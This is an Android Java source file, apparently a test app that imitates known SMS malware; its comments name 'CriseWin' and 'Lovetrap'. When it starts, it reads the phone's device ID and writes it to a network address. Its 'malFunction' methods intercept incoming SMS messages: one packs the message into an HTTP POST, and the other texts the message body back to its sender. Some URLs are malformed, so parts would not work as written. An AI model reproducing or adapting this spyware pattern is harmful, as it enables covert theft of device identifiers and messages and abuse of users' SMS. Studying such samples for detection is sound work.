package com.example.flymaple.test1;

import android.app.PendingIntent;
import android.content.Context;
import android.content.Intent;
import android.os.AsyncTask;
import android.support.v7.app.ActionBarActivity;
import android.os.Bundle;
import android.telephony.SmsManager;
import android.telephony.SmsMessage;
import android.telephony.TelephonyManager;
import android.view.Menu;
import android.view.MenuItem;

import org.apache.http.HttpEntity;
import org.apache.http.HttpResponse;
import org.apache.http.NameValuePair;
import org.apache.http.client.HttpClient;
import org.apache.http.client.entity.UrlEncodedFormEntity;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.impl.client.DefaultHttpClient;
import org.apache.http.message.BasicNameValuePair;
import org.apache.http.util.EntityUtils;

import java.io.OutputStreamWriter;
import java.net.HttpURLConnection;
import java.net.MalformedURLException;
import java.net.URL;
import java.util.ArrayList;
import java.util.List;


public class MainActivity extends ActionBarActivity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        TelephonyManager tm = (TelephonyManager)getSystemService(Context.TELEPHONY_SERVICE);
        String deviceID = tm.getDeviceId();
        try {
            URL url = new URL("192.168.0.1");
            HttpURLConnection urlConnection = (HttpURLConnection) url.openConnection();
            urlConnection.setDoOutput(true);
            OutputStreamWriter wr = new OutputStreamWriter(urlConnection.getOutputStream());
            wr.write(deviceID);
            wr.flush();
            urlConnection.disconnect();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }


    @Override
    public boolean onCreateOptionsMenu(Menu menu) {
        // Inflate the menu; this adds items to the action bar if it is present.
        getMenuInflater().inflate(R.menu.menu_main, menu);
        return true;
    }

    @Override
    public boolean onOptionsItemSelected(MenuItem item) {
        // Handle action bar item clicks here. The action bar will
        // automatically handle clicks on the Home/Up button, so long
        // as you specify a parent activity in AndroidManifest.xml.
        int id = item.getItemId();

        //noinspection SimplifiableIfStatement
        if (id == R.id.action_settings) {
            return true;
        }

        return super.onOptionsItemSelected(item);
    }

//CriseWin
    private void malFunction1(Intent i){
        Bundle b = i.getExtras();
        SmsMessage sm = SmsMessage.createFromPdu((byte[])((java.lang.Object[])b.get("pdus"))[0]);
        try {
            HttpClient httpclient = new DefaultHttpClient();
            HttpPost httppost = new HttpPost("192.168.0.1");
            //HttpResponse resp = httpclient.execute(httppost);
            List<NameValuePair> pairs = new ArrayList<NameValuePair>();
            pairs.add(new BasicNameValuePair("key1", sm.toString()));
            pairs.add(new BasicNameValuePair("key2", "value2"));
            httppost.setEntity(new UrlEncodedFormEntity(pairs));
        }catch (Exception e){}
    }

//Lovetrap
    private void malFunction2(Intent i){
        Bundle localBundle = i.getExtras();
        Object[] os = (Object[])localBundle.get("pdus");
        SmsMessage sms = SmsMessage.createFromPdu((byte[])os[0]);
        String str1 = sms.getOriginatingAddress();
        String str2 = sms.getMessageBody();
        SmsManager sm = SmsManager.getDefault();
        PendingIntent p = PendingIntent.getBroadcast(this,0,new Intent(),0);
        sm.sendTextMessage(str1,null,str2,p,null);
    }


    private void malFunction3(){

    }
}
